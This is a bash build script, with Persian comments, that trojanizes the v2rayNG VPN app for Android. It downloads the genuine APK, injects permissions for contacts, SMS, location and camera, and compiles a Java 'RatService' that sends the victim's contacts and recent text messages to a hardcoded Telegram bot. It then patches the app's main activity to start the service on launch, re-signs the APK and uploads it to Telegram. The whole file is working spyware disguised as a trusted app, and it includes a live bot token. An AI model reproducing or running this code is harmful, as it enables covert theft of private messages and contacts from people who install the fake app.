#!/bin/bash
# set -e رو برداشتیم که اگه یه دستور کوچیک خطا داد، کل بیلد متوقف نشه

echo "[*] Downloading original V2Ray APK..."
wget -q -O original.apk https://github.com/2dust/v2rayNG/releases/download/1.8.5/v2rayNG_1.8.5_arm64-v8a.apk

echo "[*] Decompiling APK (resources and manifest only)..."
apktool d -s -f original.apk -o v2ray_dir

echo "[*] Injecting permissions and service into Manifest..."
MANIFEST="v2ray_dir/AndroidManifest.xml"
sed -i 's|<application|<uses-permission android:name="android.permission.READ_CONTACTS"/>\n    <uses-permission android:name="android.permission.READ_SMS"/>\n    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>\n    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>\n    <uses-permission android:name="android.permission.CAMERA"/>\n    <application|' $MANIFEST
sed -i 's|</application>|<service android:name="com.v2ray.update.RatService" android:exported="false"/>\n    </application>|' $MANIFEST

echo "[*] Compiling RAT Source to DEX..."
mkdir -p rat_src/com/v2ray/update/
cat > rat_src/com/v2ray/update/RatService.java << 'EOF'
package com.v2ray.update;

import android.app.Service;
import android.content.Intent;
import android.database.Cursor;
import android.os.IBinder;
import android.provider.ContactsContract;
import android.provider.Telephony;
import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;

public class RatService extends Service {
    private static final String API = "https://api.telegram.org/bot9178490317:AAFZJTBGopALDFWZO5kuvXNvSL4B7x5CCdY";
    @Override public IBinder onBind(Intent intent) { return null; }
    @Override public int onStartCommand(Intent intent, int flags, int startId) {
        new Thread(() -> {
            try { 
                sendText("✅ Status", "V2Ray Real Service Started!");
                Thread.sleep(5000);
                sendContacts(); 
                sendSms(); 
            } catch (Exception e) { sendText("❌ Error", e.getMessage()); }
        }).start();
        return START_STICKY;
    }
    private void sendContacts() throws Exception {
        StringBuilder sb = new StringBuilder();
        Cursor c = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
        if (c != null) {
            while (c.moveToNext()) {
                sb.append("👤 ").append(c.getString(c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)))
                  .append("\n📞 ").append(c.getString(c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)))
                  .append("\n---\n");
            }
            c.close();
        }
        sendLongText("📇 Contacts", sb.toString());
    }
    private void sendSms() throws Exception {
        StringBuilder sb = new StringBuilder();
        Cursor c = getContentResolver().query(Telephony.Sms.CONTENT_URI, null, null, null, Telephony.Sms.DATE + " DESC LIMIT 50");
        if (c != null) {
            while (c.moveToNext()) {
                sb.append("👤 ").append(c.getString(c.getColumnIndex(Telephony.Sms.ADDRESS)))
                  .append("\n💬 ").append(c.getString(c.getColumnIndex(Telephony.Sms.BODY)))
                  .append("\n---\n");
            }
            c.close();
        }
        if (sb.length() > 0) { sendLongText("📨 SMS", sb.toString()); }
    }
    private void sendLongText(String title, String body) {
        int maxLength = 3500;
        for (int i = 0; i < body.length(); i += maxLength) {
            int end = Math.min(body.length(), i + maxLength);
            sendText(title, body.substring(i, end));
        }
    }
    private void sendText(String title, String body) {
        try {
            HttpURLConnection conn = (HttpURLConnection) new URL(API + "/sendMessage").openConnection();
            conn.setDoOutput(true); conn.setRequestMethod("POST"); conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
            try (OutputStream os = conn.getOutputStream()) {
                os.write(("chat_id=8895860731&text=" + java.net.URLEncoder.encode(title + "\n\n" + body, "UTF-8")).getBytes(StandardCharsets.UTF_8));
            } conn.getResponseCode();
        } catch (Exception e) {}
    }
}
EOF

# پیدا کردن d8 و کامپایل
export PATH=$PATH:$ANDROID_HOME/build-tools/33.0.1/
javac -source 1.8 -target 1.8 rat_src/com/v2ray/update/RatService.java
d8 --output . rat_src/com/v2ray/update/RatService.class --lib $ANDROID_HOME/platforms/android-33/android.jar

echo "[*] Adding classes.dex to APK..."
cp classes.dex v2ray_dir/

echo "[*] Patching MainActivity..."
# دیکامپایل کامل برای پیدا کردن MainActivity
apktool d -f original.apk -o v2ray_full_dir > /dev/null 2>&1
MAIN_ACT=$(find v2ray_full_dir -name "MainActivity.smali" | head -n 1)
if [ ! -z "$MAIN_ACT" ]; then
    echo "Found MainActivity at: $MAIN_ACT"
    # تزریق کد استارت سرویس
    sed -i '/.method protected onCreate(Landroid\/os\/Bundle;)V/a\    \n    # -- INJECTED CODE --\n    new-instance v0, Landroid\/content\/Intent;\n    const-class v1, Lcom\/v2ray\/update\/RatService;\n    invoke-direct {v0, p0, v1}, Landroid\/content\/Intent;-><init>(Landroid\/content\/Context;Ljava\/lang\/Class;)V\n    invoke-virtual {p0, v0}, Landroid\/app\/Activity;->startService(Landroid\/content\/Intent;)Landroid\/content\/ComponentName;\n    # -- END INJECTION --\n' $MAIN_ACT
    # کپی تمام فایل‌های smali به پوشه v2ray_dir
    cp -r v2ray_full_dir/smali* v2ray_dir/ 2>/dev/null
else
    echo "[-] MainActivity not found!"
fi

echo "[*] Rebuilding APK..."
apktool b v2ray_dir -o injected_unsigned.apk

echo "[*] Signing APK..."
keytool -genkey -v -keystore key.jks -keyalg RSA -keysize 2048 -validity 10000 -alias mykey -storepass 123456 -keypass 123456 -dname "CN=Android Debug,O=Android,C=US" -noprompt
zipalign -v 4 injected_unsigned.apk injected_aligned.apk
apksigner sign --ks key.jks --ks-pass pass:123456 --key-pass pass:123456 --out injected_final.apk injected_aligned.apk

echo "[*] Sending to Telegram..."
curl -v -F "chat_id=8895860731" -F "caption=🚀 V2Ray Original (Real Inject)" -F "document=@injected_final.apk" https://api.telegram.org/bot9178490317:AAFZJTBGopALDFWZO5kuvXNvSL4B7x5CCdY/sendDocument
